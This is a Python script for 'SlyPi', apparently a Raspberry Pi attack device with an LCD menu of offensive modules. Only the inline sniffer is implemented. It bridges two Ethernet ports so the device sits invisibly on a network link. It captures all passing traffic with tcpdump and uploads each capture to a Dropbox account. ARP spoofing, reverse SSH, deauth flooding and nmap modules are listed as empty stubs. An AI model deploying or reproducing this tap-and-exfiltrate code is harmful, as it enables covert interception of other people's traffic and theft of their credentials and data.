#!/usr/bin/python
import os
from time import sleep
from Adafruit_CharLCDPlate import Adafruit_CharLCDPlate
import subprocess
from dbupload import upload_file #Used for Dropbox uploading
from datetime import datetime # Used the genreate the filename used in the packet capture dump

# Initialize the LCD plate.  Should auto-detect correct I2C bus.  If not,
# pass '0' for early 256 MB Model B boards or '1' for all later versions
lcd = Adafruit_CharLCDPlate(busnum = 0)

# The following are the modules which can be added the SlyPi Device.
# To add the module simply define the function below and then add the module name and function name to the modules dictonary.
# All code the module executes is to be placed in the function.
def inlineSniffer():
    print "Inline Sniffer"
    #Counts the number of files that have been dumped
    count = 0 
    #Change thease values so that the dumped file is uploaded to your dropbox account.
    dropbox_email = "ENTER HERE YOUR DROPBOX EMAIL"
    dropbox_password = "ENTER HERE YOUR DROPBOX PASSWORD"
    #the following 7 lines setup the bridge between the two ethernet ports.
    os.system("ifconfig eth0 0.0.0.0")
    os.system("ifconfig eth1 0.0.0.0")
    os.system("brctl addbr bridge0")
    os.system("brctl addif bridge0 eth0")
    os.system("brctl addif bridge0 eth1")
    os.system("dhclient bridge0")
    os.system("ifconfig bridge0 up")
    lcd.clear()
    lcd.backlight(lcd.GREEN)
    lcd.message("Ethernet Bridge\nSetup Successful")
    while True:
        count = count + 1
        fileName = str(datetime.now().day) + "-" + str(datetime.now().month) + "-" + str(datetime.now().year) + " AT " + str(datetime.now().hour) + "-" + str(datetime.now().minute)
        #Sets up the TCPDump command
        tcpDumpProcess = subprocess.Popen(["tcpdump", "-Z", "root", "-w", fileName, "-i", "bridge0", "-G", "60", "-W", "1"])
        #Runs the TCPDump command
        tcpDumpProcess.communicate() 
        lcd.message("Dumping File\n" + str(count))
        #Uploads the dump file to dropbox
        upload_file(fileName,"/",fileName, dropbox_email,dropbox_password) 
        lcd.message("File" + str(count) +  "uploaded to Dropbox")
    
def printer():
    print "Mass Network Printer"
    
def aprSpoof():
    print "ARP Cache Poisoning"

def reverseSSH():
    print 'Reverse SSH'

def deauthFlood():
    print 'Deauth Flood'
    
def upsidedown():
    print 'Upside Down internet'
    
def nmapScanUpload():
    print 'Nmap Scan & Upload'  

#Contains all modules which can be run on the device. The key is the displayed name on the LCD and the value is the function name
modules = {'Inline Ethernet\nSniffer': 'inlineSniffer', 'Mass Network\nPrinter': 'printer', 'ARP Cache\nSpoofing': 'aprSpoof', 'Reverse SSH\nTunnel': 'reverseSSH', 'Deauth\nFlooding': 'deauthFlood', 'Upside-Down\nInternet': 'upsidedown', 'NMAP Scan\nand Upload': 'nmapScanUpload'}
displayText = modules.keys()
# Clears the display
lcd.clear()
#Used to control the flow through the menu
menuOption = 0
lcd.backlight(lcd.BLUE)
lcd.message("SlyPi\nPress Select")

#The following while loop controls the LCD menu and the control using the keypad through the menu.
while True:
    if lcd.buttonPressed(lcd.SELECT):
        sleep(0.5)
        lcd.clear()
        lcd.message(displayText[menuOption])
        while True:
            if lcd.buttonPressed(lcd.DOWN):
                menuOption = menuOption + 1
                if menuOption > len(modules) - 1:
                    menuOption = 0
                lcd.clear()
                lcd.message(displayText[menuOption])
                sleep(0.5)
            if lcd.buttonPressed(lcd.UP):
                menuOption = menuOption - 1
                if menuOption < 0:
                    menuOption = len(modules) - 1
                lcd.clear()
                lcd.message(displayText[menuOption])
                sleep(0.5)
            if lcd.buttonPressed(lcd.SELECT):
                globals().get(modules[displayText[menuOption]])()
                sleep(0.5)                 